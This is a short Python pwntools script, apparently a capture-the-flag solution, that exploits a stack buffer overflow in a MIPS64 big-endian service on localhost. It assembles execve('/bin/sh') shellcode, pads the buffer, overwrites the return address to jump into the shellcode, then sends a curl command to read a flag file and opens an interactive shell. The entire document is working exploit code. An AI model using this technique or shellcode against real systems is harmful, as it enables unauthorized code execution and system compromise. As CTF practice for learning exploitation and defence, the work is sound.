from pwn import *

context.update(arch='mips64', endian='big', log_level='debug') # binary is mips64 big endian

io = remote('localhost', 4000)

sc = asm("""
    /* load addr of '/bin/sh' string from binary into first arg ($a0) */
    ori $t0, $zero, 0x0001
    dsll $t0, $t0, 16
    ori $t0, $t0, 0x2002
    dsll $t0, $t0, 16
    ori $t0, $t0, 0x59a0      

    move $a0, $t0
    /* set second and third args to 0 ($a1, $a2) */
    li $a1, 0
    li $a2, 0
    li $v0, 5057 # execve = 5057 ($v0)        
    syscall
""")

buf = 0x4000800b40 # buffer start
padding = b'A' * (128 - len(sc))

payload = sc
payload += padding
payload += b'B' * 8
payload += p64(buf)  # $ra overwrite (return address)

io.recvuntil(b'[guest@mipsy] $ ')
io.sendline(b'3')
io.recvuntil(b'Input your password:\n>>> ')
io.send(payload)
sleep(0.5)
io.sendline(b'a')
sleep(0.5)
io.sendline(b'curl itsy-mipsy-router-filer/flag.txt')
io.interactive()